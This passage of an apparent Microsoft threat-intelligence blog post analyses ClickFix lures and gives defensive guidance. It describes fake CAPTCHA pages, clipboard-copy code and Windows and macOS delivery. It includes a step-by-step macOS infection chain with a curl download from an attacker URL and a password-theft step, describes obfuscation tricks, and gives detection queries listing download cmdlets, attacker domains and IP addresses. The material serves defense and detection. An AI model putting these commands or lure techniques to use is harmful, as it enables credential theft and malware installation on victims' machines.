movies on certain websites inadvertently launched a variety of scam pages in a new browser tab when they interacted with a movie (for example, by pressing the play button): Figure 11. Example of a free movie streaming website One of these scam pages was a ClickFix landing page that downloaded and installed Lumma Stealer: Figure 12. ClickFix landing page the users were redirected to if they clicked the \u201cPlay\u201d button on the free movie website This activity cluster is notable because it renamed the various intermediate HTA scripts to media format extensions such as .mp3 , .mp4 , or .ogg . It\u2019s also notable for its high traffic volumes: in a single day, tens of thousands, if not hundreds of thousands, of unique visitors could be funneled to scam pages (including the ClickFix landing page) through the malvertising redirectors. Drive-by compromise Some threat actors have also been observed to leverage compromised websites to deliver the ClickFix landing page. For example, the threat actor we track as Storm-0249 has traditionally used email to deliver Latrodectus or other initial access malware\u2014whether by using PDF files or URL links (sometimes copyright infringement -themed). However, since the beginning of March 2025, Storm-0249 switched to compromising legitimate websites, potentially through WordPress vulnerabilities, and using the ClickFix technique to deliver its payloads. When a user visits the compromised site, the original page is briefly displayed before it\u2019s replaced with the ClickFix human verification lure. This specific lure even spoofs Cloudflare to further trick users into thinking that the verification step is legitimate: Figure 13. ClickFix lure spoofing Cloudflare Turnstile on a compromised site Inside the click: ClickFix implementations ClickFix operators use several methods to attempt to convince a target to perform user-level command execution on their system. Early landing pages mimicked Google\u2019s \u201c Aw, Snap! \u201d crash error or Word Online extension missing message (as depicted in Figure 4), while recent ones spoof Google\u2019s reCAPTCHA and Cloudflare\u2019s Turnstile solution. We\u2019ve even observed threat actors spoof social media platforms like Discord to trick users into believing they\u2019re joining an actual Discord server. Many elements go into building ClickFix lure pages\u2014from JavaScript inline frames (iframes) and HTML href codes to cascading style sheets (CSS) resources\u2014to make them more legitimate-looking. There are various ways that ClickFix is implemented: some implementations are contained in one file or page, while others use remote resources. Some threat actors leave code comments amateurishly while others obfuscate their code. There are even implementations that report the status of an infection to a Telegram channel or a web server. We provide a few examples of these implementations and discuss their inner workings. Impersonating Cloudflare Turnstile Figure 14 shows a partial screenshot of a ClickFix landing page, binancepizza[.]info , displaying a seemingly legitimate Cloudflare Turnstile verification process that a user is lured to interact with before they can supposedly access the site: Figure 14. The ClickFix landing page binancepizza[.]info Its HTML source code clones this Cloudflare Turnstile style page using a href attribute to a CSS resource hosted by the Font Awesome library: Figure 15. HTML code highlighting a CSS resource for a Cloudflare verification prompt The page also references an HTML file ( field.html ) using a hidden iframe: Figure 16. HTML code highlighting hidden iframe and text needing to \u201cverify\u201d Within field.html , we see in Figure 17 that contentEl is the iframe element representing the fake Cloudflare Turnstile verification check box. When a user ticks the Verify you are human check box, this script animates a fake spinner through runVerification() and sends postMessage(\u201ctrigger\u201d) to the parent window (the main landing page). Figure 17. JavaScript code of iframe field.html, highlighting elements that send a trigger message upon verification click The user is then presented with the ClickFix instructions (Figure 18), while the obfuscated command is copied to the user\u2019s clipboard (Figure 19): Figure 18. ClickFix instructions from binancepizza[.]info Figure 19. Malicious command copied to clipboard Figure 20 shows that the clipboard copy occurs once the code receives the message \u201ctrigger\u201d, which is sent by the field.html hidden iframe. Once that message is received, the script uses navigator.clipboard.writeText(codeToCopy) to copy the command to the clipboard. Figure 20. JavaScript code highlighting the method navigator.clipboard.writeText, which copies a malicious command to clipboard Impersonating social platforms It\u2019s important to note that not all ClickFix landing pages are designed in the same manner and might not strictly contain the elements discussed previously. In some instances, threat actors also mimic popular social platforms to broaden their reach of potential targets. Figure 21 shows a ClickFix landing page spoofing a Discord server supposedly needing to verify a user before they can join: Figure 21. Fake Discord server landing page implementing ClickFix. In this page\u2019s source code (Figure 22), we can see it referencing the Discord logo image file to appear legitimate. Additionally, the addEventListener method waits for the Verify button to get clicked (through verifyBtn ) so navgiator.clipboard.writetext(command) can copy the malicious command to the user\u2019s clipboard. This JavaScript method is a Clipboard API that allows for accessing the operating system (OS) clipboard. Older pages might use document.execCommand() , which is now deprecated. The fake Discord landing page differs from the previous example because the reference of an external trigger (from the hidden iframe) isn\u2019t used here. Instead, the click then copy is all processed from the main window. Based on our analysis, this landing page also appears to be part of the OBSCURE#BAT campaign delivering r77 rootkit. Figure 22. HTML code highlighting use of Discord logo and JavaScript elements that copy a malicious command to clipboard upon clicking \u201cverify\u201d The \u201cfix\u201d: User-level code execution The ClickFix technique typically presents its \u201cfix\u201d by instructing users to run malicious commands or code in the Windows Run dialog box. We assess that the threat actors who use this technique are banking on the idea that most of their targets aren\u2019t familiar with this Windows OS component and what it\u2019s used for, unlike the more advanced users doing system administrator tasks. Early ClickFix lures instructed users to run commands manually and directly in Windows Terminal or Windows PowerShell. However, multiple line warnings might have deterred potential victims from running these commands, leading to the threat actors changing their tactics. Figure 23. Example of a multiple line warning in Windows Terminal Detecting Windows Run dialog misuse The Windows Run dialog ( Win + R ) is a trusted shell input user interface (UI) that\u2019s part of Windows Explorer ( explorer.exe ). Internally, it uses ShellExecute or CreateProcess APIs to resolve and launch commands. The input is limited to MAX_PATH , requiring a null-terminated string ( \\0 ) with a practical maximum of 259 characters. Additionally, as part of the Run dialog, Windows loads tiptsf.dll module in explorer.exe . This DLL file is related to the Text Services Framework (TSF), which provides input processor interface. Figure 24. The Windows Run dialog box Entering commands into the Run dialog leaves forensic traces\u2014most notably in the RunMRU (Most Recently Used) registry key. This key keeps a history of Run dialog executions and can be used to reconstruct user-initiated activity during investigations. Note that it doesn\u2019t create a registry entry if the process execution fails. Figure 25. RunMRU registry key entry with a malicious ClickFix command To determine if a ClickFix command execution is potentially occurring in the environment, one can check the RunMRU entries if they include signs pointing to LOLBins\u2014such as powershell , mshta , rundll32 , wscript , curl , and wget \u2014that can execute code and/or download payloads. PowerShell continues to be the most leveraged native binary, with cmdlets such as iwr ( Invoke-WebRequest ), irm ( Invoke-RestMethod ), and iex ( Invoke-Expression ) being very prolific. Additional suspicious elements to check in entries within the RunRMU registry key include the following: First-stage payloads are often hosted by direct IP addresses, content delivery network (CDN) domains, interesting top-level domains (for example, .live , . shop , .icu ), or code-sharing platforms such as pastes. First-stage payloads are often delivered and/or launched as specific file type such as .html , .hta , .txt , .zip , .msi , .bat , .ps1 , or .vbs The file type of the scripts might be renamed to media extensions (such as .png , .mp3 , .mp4 , .wav , and .jpg ) to hide their true intent. The file type might employ double file extension for evasion (for example, file.hta.mp4 ) URLs are often shortened using shorteners such as Bitly. A fake reCAPTCHA, CAPTCHA, or Turnstile confirmation is included, such as the following: \u2705 \u201cI am not a robot \u2013 reCAPTCHA Verification ID: XXXX\u201d # # I am not a robot: CAPTCHA Verification UID: XXXX\\ # \u201cHuman, not a robot: CAPTCHA: Verification ID: XXXX\u201d \u2714\ufe0f \u201cCloud identificator:XXXX\u201d Figure 26. Examples of generic ClickFix commands Obfuscation and execution techniques for defense evasion The command examples in the previous section aren\u2019t all encompassing, as we\u2019ve observed threat actors employing a growing number of obfuscation and execution techniques for defense evasion. These techniques include nested execution chains, proxy command abuse, encoding schemes such as Base64, use of string concatenation/fragmentation, and escaped characters, among others. Figure 27. Example of a ClickFix command that was using nested PowerShell, string obfuscation through concatenated ampersand (\u201c&\u201d) delimiters, and benign sounding phrase (for example, \u201cMicrosoft Defender Services Secure Access\u201d) Figure 28. Example of a ClickFix command that was using LOLBIN stacking (repeated cmd.exe) and obfuscation through escape characters (^) Figure 29. Example of a ClickFix command that was obfuscated using string splitting and concatenation, indexed character access through the $1 command string, and ampersand execution Beyond Windows: ClickFix targeting macOS users In June 2025, a ClickFix campaign was reported to be targeting macOS users to deliver Atomic macOS Stealer (AMOS). This new campaign is yet another mark in the continuously evolving threat landscape, as the ClickFix technique was previously observed to be more common in Windows-based attacks. The campaign, which according to our analysis goes back to late May 2025, redirected target users to Clickfix-themed delivery websites that were impersonating Spectrum, a US-based company that provides services for cable television, internet access, and unified communications: Figure 30. ClickFix landing page with a fake CAPTCHA Like any other ClickFix campaign, when the user clicks the Alternate verification button, the page displays instructions the user has to follow to \u201cfix\u201d their issue. Interestingly, the steps the lure displays even on macOS users are for Windows devices: Figure 31. ClickFix instructions presented to the target user Meanwhile, in the background, a malicious command is copied to the user\u2019s clipboard. The command that is copied is different for macOS and Windows devices. Windows: Figure 32. Screenshot of the ClickFix command copied on Windows devices macOS: Figure 33. Screenshot of the ClickFix command copied on macOS devices The command that\u2019s copied for macOS devices instructs the system to perform the following actions: Get current user: username=$(whoami) Prompt for the correct password: Continuously prompt System Password: until the user enters the correct password Validate password: Use dscl . -authonly to verify the password against macOS directory services Store password: Save the valid password to the /tmp/.pass file Download payload: curl -o /tmp/update hxxps[:]//applemacios[.]com/getrur/update Remove quarantine: Use the stolen password with sudo -S xattr -c to bypass macOS security Make an executable file: chmod +x /tmp/update Launch the malware: Run the downloaded file /tmp/update The file saved as update within the tmp directory belongs to the AMOS malware family. AMOS variants such as Poseidon and Odyssey are known to steal user information, including browser cookies, passwords, and cryptocurrency wallet credentials. Behind the click: ClickFix kits and other services for sale Microsoft Threat Intelligence has observed several threat actors selling the ClickFix builders (also called \u201cWin + R\u201d) on popular hacker forums since late 2024. Some of these actors are bundling ClickFix builders into their existing kits that already generate various files such as LNK, JavaScript, and SVG files. The kits offer creation of landing pages with a variety of available lures including Cloudflare. They also offer construction of malicious commands that users will paste into the Windows Run dialog. These kits claim to guarantee antivirus and web protection bypass (some even promise that they can bypass Microsoft Defender SmartScreen ), as well as payload persistence. The cost of subscription to such a service might be between US$200 to US$1,500 per month. We\u2019ve also discovered sellers that offer one-time and piece-meal solutions (for example, only the source code, landing page, or the command line) priced anywhere between US$200 and US$500. Figures 34 and 35 show an example of a ClickFix builder that offers a variety of configurable options such as: Displaying a decoy PDF file after a target user is phished Payload execution timing Virtual machine (VM) detection and evasion (\u201cAnti VM\u201d) and user access control (UAC) bypass Visual template to be used, such as Google Meet, Google CAPTCHA, or Cloudflare Language to be used, for example, English, German, Spanish, French, Italian, or Portuguese Figure 34. Screenshot of a ClickFix builder, taken from the seller\u2019s demo video Figure 35. Another screenshot of a ClickFix builder, taken from the seller\u2019s demo video ClickFix protection and detection Microsoft Defender XDR offers comprehensive coverage for ClickFix attacks by leveraging a range of available technologies across different attack layers. For example, Microsoft Defender SmartScreen displays a warning to Microsoft Edge users when they visit a ClickFix landing page: Figure 36. Microsoft Defender SmartScreen flagging a ClickFix landing page Even if a user chooses to bypass the SmartScreen warning or is using a different web browser and is socially engineered to execute a command in the Run dialog, Microsoft Defender for Endpoint detects and mitigates the attacks initial access activities like the suspicious process execution and command-line activity during the process scan phase. Most attack paths eventually lead to the execution of either PowerShell or HTA scripts. Microsoft\u2019s Antimalware Scan Interface (AMSI) provides scanning capabilities for both scripting environments and PowerShell applications. Defender\u2019s Cloud Protection delivers enhanced protection by monitoring and intercepting outgoing connections to malicious URLs as well as analyzing process execution patterns. Additionally, Microsoft Defender for Office 365 analyzes end-to-end links and HTML attachments, and has fake CAPTCHA behavioral signatures that proactively block ClickFix-related phishing emails. Additional attack chain coverage with network protection In early 2025, Microsoft Defender Experts observed thousands of devices being affected by a ClickFix attack (that is, the ClickFix command was executed by a user on the device) per month, even with an endpoint detection and response (EDR) solution enabled. Due to this, our researchers performed pattern-of-life analysis to follow the tactics, techniques, and procedures (TTPs) in the attack timeline and understand the gaps that can be filled so that the attack could be stopped at the initial access stage. Their research resulted in the automation of the analysis and collection of numerous obfuscated/encoded LOLBin commands observed in the RunMRU registry, and they were able to successfully extract and block newly created malicious domainsthrough Defender for Endpoint\u2019s network protection feature . This feature is an important component on the protection against ClickFix because blocking the C2 domains early in the attack chain prevents the download and/or execution of first-stage payloads, effectively making the attack unsuccessful. Recommendations Microsoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat. Educate users to identify social engineering attacks. Ensure users are aware of what they copy and paste. Check your Microsoft 365 email filtering settings to ensure spoofed emails, spam, and emails with malware are blocked. Use Microsoft Defender for Office 365 for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Defender for Office 365 to recheck links on click and delete sent mail in response to newly acquired threat intelligence. Turn on safe attachments policies to check attachments to inbound email. Consider using enterprise-managed browsers , which provide multiple security features including security update requirements and data compliance policies . Block web pages from automatically running Flash plugins. Enable network protection and web protection in Microsoft Defender for Endpoint to safeguard against malicious sites and internet-based threats. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants. Enable PowerShell script block logging to detect and analyze obfuscated or encoded commands, providing visibility into malicious script execution that might otherwise evade traditional logging. Use PowerShell execution policies such as setting AllSigned or RemoteSigned tohelp reduce the risk of malicious execution by ensuring only trusted, signed scripts are executed, adding a layer of control. Use Group Policy to deploy hardening configurations throughout your environment, if certain features are not necessary: Disable the Run dialog box ( Win + R ) key and remove the Run option from the Start Menu by selecting User Configuration > Administrative Templates > Start Menu and Taskbar > Remove Run menu from Start Menu . Create an App Control policy that prohibits the launch of native Windows binaries from Run . This can be accomplished by defining a rule based on the specific process that is launching binaries like PowerShell. Configure Windows Terminal access and settings to warn users when the text they\u2019re pasting contains multiple lines . Microsoft Defender XDR customers can also implement the following attack surface reduction rules to harden an environment against PowerShell techniques used by threat actors: Block execution of potentially obfuscated scripts Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block JavaScript or VBScript from launching downloaded executable content Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Microsoft Defender Antivirus Microsoft Defender Antivirus detects this threat as the following malware: Behavior:Win32/ClickFix Behavior:Win32/SuspClickFix Trojan:Win32/ClickFix Trojan:Script/ClickFix Behavior:Win32/RegRunMRU Trojan:HTML/FakeCaptcha Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity: Suspicious command in RunMRU registry Use of living-off-the-land binary to run malicious code Suspicious process executed PowerShell command Suspicious PowerShell command line Suspicious \u2018SuspClickFix\u2019 behavior was blocked An active \u2018SuspDown\u2019 malware was prevented from executing via AMSI Suspicious \u2018MaleficAms\u2019 behavior was blocked An active \u2018ClickFix\u2019 malware in a command line was prevented from executing \u2018ClickFix\u2019 malware was prevented Information stealing malware activity Powershell made a suspicious network connection Suspicious process launch by Rundll32.exe Suspicious Rundll32 command-line Suspicious Scheduled Task Process Launched Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects malicious activity associated with this threat through the following alerts: A potentially malicious URL click was detected Email messages containing malicious URL removed after delivery Email messages removed after delivery A user clicked through to a potentially malicious URL Suspicious email sending patterns detected Email reported by user as malware or phish Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following pre-built promptbooks to automate incident response or investigation tasks related to this threat: Check impact of an external threat article Suspicious script analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender Threat Intelligence DarkGate malware samples delivered through fake Notion websites followed by ClickFix technique ClickFix and spoofed IT apps deliver RATs via Node.js over Cloudflare Quick Tunnels Phishing campaign impersonates Booking.com, delivers multiple commodity malware types Storm-1877 evolving tactics to target users with ClickFix attacks Email phishing campaign leads to Xworm ClickFix technique leverages clipboard to run malicious commands Lampion Is Back With ClickFix Lures Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: ClickFix commands execution Identify ClickFix commands execution. DeviceRegistryEvents | where ActionType =~ \"RegistryValueSet\" | where InitiatingProcessFileName =~ \"explorer.exe\" | where RegistryKey has @\"\\CurrentVersion\\Explorer\\RunMRU\" | where RegistryValueData has \"\u2705\" or (RegistryValueData has_any (\"powershell\", \"mshta\", \"curl\", \"msiexec\", \"^\") and RegistryValueData matches regex \"[\\u0400-\\u04FF\\u0370-\\u03FF\\u0590-\\u05FF\\u0600-\\u06FF\\u0E00-\\u0E7F\\u2C80-\\u2CFF\\u13A0-\\u13FF\\u0530-\\u058F\\u10A0-\\u10FF\\u0900-\\u097F]\") or (RegistryValueData has \"mshta\" and RegistryValueName !~ \"MRUList\" and RegistryValueData !in~ (\"mshta.exe\\\\1\", \"mshta\\\\1\")) or (RegistryValueData has_any (\"bitsadmin\", \"forfiles\", \"ProxyCommand=\") and RegistryValueName !~ \"MRUList\") or ((RegistryValueData startswith \"cmd\" or RegistryValueData startswith \"powershell\") and (RegistryValueData has_any (\"-W Hidden \", \" -eC \", \"curl\", \"E:jscript\", \"ssh\", \"Invoke-Expression\", \"UtcNow\", \"Floor\", \"DownloadString\", \"DownloadFile\", \"FromBase64String\", \"System.IO.Compression\", \"System.IO.MemoryStream\", \"iex\", \"Invoke-WebRequest\", \"iwr\", \"Get-ADDomainController\", \"InstallProduct\", \"-w h\", \"-X POST\", \"Invoke-RestMethod\", \"-NoP -W\", \".InVOKe\", \"-useb\", \"irm \", \"^\", \"[char]\", \"[scriptblock]\", \"-UserAgent\", \"UseBasicParsing\", \".Content\") or RegistryValueData matches regex @\"[-/\u2013][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\\s[A-Za-z0-9+/=]{15,}\")) Lampion malware activity The following query searches for PowerShell command associated with Lampion malware activity that is used to download malicious files. DeviceProcessEvents | where InitiatingProcessFileName == \"powershell.exe\" | where InitiatingProcessParentFileName == \"explorer.exe\" | where FileName has_any (\"WScript.exe\") | where ProcessCommandLine contains \"\\\"PowerShell.exe\\\" -windowstyle minimized -Command\" and ProcessCommandLine has \"Invoke-WebRequest\" Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. Below are the queries using Sentinel Advanced Security Information Model (ASIM) functions to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces from GitHub , using an ARM template or manually Detect network IP and domain indicators of compromise using ASIM The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser: //IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic([\"185.234.72.186\", \"45.94.31.176\", \"3.138.123.13\", \"16.171.23.221\", \"3.23.103.13\", \"83.242.96.159\", \"5.8.9.77\"]); let ioc_domains = dynamic([\"mein-lonos-cloude.de\", \"derko-meru.online\", \"objectstorage.ap-singapore-2.oraclecloud.com\", \"tesra.shop\", \"zzzp.live\", \"cqsf.live\", \"access-ssa-gov.es\", \"binancepizza.info\", \"panel-spectrum.net\"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Detect network and files hashes indicators of compromise using ASIM The following query checks IP addresses, domains, and file hash IOCs across data sources supported by ASIM web session parser: //IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic([\"185.234.72.186\", \"45.94.31.176\", \"3.138.123.13\", \"16.171.23.221\", \"3.23.103.13\", \"83.242.96.159\", \"5.8.9.77\"]); let ioc_sha_hashes =dynamic([\"061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8\", \"592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718\", \"8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629\", \"d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9\", \"f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab\"]); _Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or FileSHA256 in (ioc_sha_hashes) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor // Domain list - _Im_WebSession let ioc_domains = dynamic([\"mein-lonos-cloude.de\", \"derko-meru.online\", \"objectstorage.ap-singapore-2.oraclecloud.com\", \"tesra.shop\", \"zzzp.live\", \"cqsf.live\", \"access-ssa-gov.es\", \"binancepizza.info\", \"panel-spectrum.net\"]); _Im_WebSession (url_has_any = ioc_domains) Detect files hashes indicators of compromise using ASIM The following query checks IP addresses and file hash IOCs across data sources supported by ASIM file event parser: // file hash list - imFileEvent let ioc_sha_hashes = dynamic([\"061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8\", \"592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718\", \"8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629\", \"d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9\", \"f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab\"]); imFileEvent | where SrcFileSHA256 in (ioc_sha_hashes) or TargetFileSHA256 in (ioc_sha_hashes) | extend AccountName = tostring(split(User, @'')[1]), AccountNTDomain = tostring(split(User, @'')[0]) | extend AlgorithmType = \"SHA256\" Indicators of compromise Indicator Type Description First seen Last seen mein-lonos-cloude[.]de Domain Actor-controlled ClickFix landing page used in a MintsLoader campaign 2025-03-26 2025-03-26 derko-meru[.]online Domain MintsLoader C2 2025-03-26 2025-03-26 tesra[.]shop Domain Domain used in ClickFix command (entered into Run dialog) in a Lumma Stealer malvertising campaign 2025-04-02 2025-04-02 cqsf[.]live Domain Domain used in ClickFix command (entered into Run dialog) in the Latrodectus drive-by campaign 2025-05-14 2025-05-14 access-ssa-gov[.]es Domain ClickFix landing page used in a phishing campaign impersonating Social Security Administration (SSA) 2025-06-02 2025-06-02 binancepizza[.]info Domain ClickFix landing page 2025-05-22 2025-05-22 panel-spectrum[.]net Domain ClickFix landing page used in a Atomic macOS Stealer (AMOS) campaign 2025-05-30 2025-05-30 access-ssa-gov[.]es/ClientSetup.exe URL URL used in ClickFix command (entered into Run dialog) in the SSA phishing campaign 2025-06-02 2025-06-02 applemacios[.]com/vv/install.sh URL URL used in ClickFix command (entered in the Bash shell) in the AMOS campaign 2025-05-30 2025-05-30 applemacios[.]com/vv/update URL URL used in the AMOS campaign to download the AMOS payload 2025-05-30 2025-05-30 guildmerger[.]co/verify/eminem URL ClickFix landing page used in OBSCURE#BAT campaign 2025-03-27 2025-03-27 files.catbox[.]moe/snenal.bat URL URL used in ClickFix command (entered into Run dialog) in the OBSCURE#BAT campaign 2025-03-27 2025-03-27 185.234.72[.]186 IP address IP address used in OBSCURE#BAT campaign for C2 2025-02-24 2025-02-24 45.94.31[.]176 IP address IP address used in OBSCURE#BAT campaign for C2 2025-03-27 2025-03-27 3.138.123[.]13 IP address IP address used in ClickFix command (entered into Run dialog) in the Lampion phishing campaign 2025-05-06 2025-05-06 16.171.23[.]221 IP address IP address used in Lampion malware campaign to download additional payloads 2025-05-06 2025-05-06 3.23.103[.]13 IP address IP address used in Lampion malware campaign for C2 2025-05-06 2025-05-06 83.242.96[.]159 IP address IP address used in Lampion malware campaign for C2 2025-05-06 2025-05-06 5.8.9[.]77 IP address IP address used in Lampion malware campaign for C2 2025-05-06 2025-05-06 References https://www.securonix.com/blog/analyzing-obscurebat-threat-actors-lure-victims-into-executing-malicious-batch-scripts-to-deploy-stealthy-rootkits/ https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers Learn more To know how Microsoft can help your team stop similar threats and prevent future compromise with human-led managed services, check out Microsoft Defender Experts for XDR . For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . Microsoft Threat Intelligence See posts by this author Microsoft Defender Experts See posts by this author Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "filtered_content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Think before you Click(Fix): Analyzing the ClickFix social engineering technique Search Research August 21, 2025 26 min read Think before you Click(Fix): Analyzing the ClickFix social engineering technique By Microsoft Threat Intelligence and Microsoft Defender Experts Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Security Experts Topics Threat intelligence Over the past year, Microsoft Threat Intelligence and Microsoft Defender Experts have observed the ClickFix social engineering technique growing in 